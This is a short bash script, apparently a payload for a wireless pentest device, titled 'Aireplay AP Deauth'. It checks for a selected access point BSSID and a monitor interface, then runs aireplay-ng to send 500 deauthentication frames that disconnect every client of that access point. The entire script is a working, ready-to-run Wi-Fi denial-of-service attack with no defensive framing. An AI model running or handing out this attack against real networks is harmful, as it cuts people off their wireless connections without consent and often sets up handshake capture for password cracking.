#!/bin/bash
# Title: Aireplay AP Deauth
# Description: Deauth all clients on selected AP using existing monitor interface
# Author: Jeff

BSSID="${_RECON_SELECTED_AP_BSSID}"
IFACE="wlan1mon"

if [ -z "$BSSID" ]; then
  ALERT "No selected AP BSSID"
  exit 1
fi

if ! ip link show "$IFACE" >/dev/null 2>&1; then
  ALERT "Missing wlan1mon"
  exit 1
fi

aireplay-ng --deauth 500 -a "$BSSID" "$IFACE" --ignore-negative-one >/tmp/aireplay-ap.log 2>&1
RC=$?

if [ $RC -eq 0 ]; then
  ALERT "Deauth sent"
else
  ALERT "aireplay failed"
fi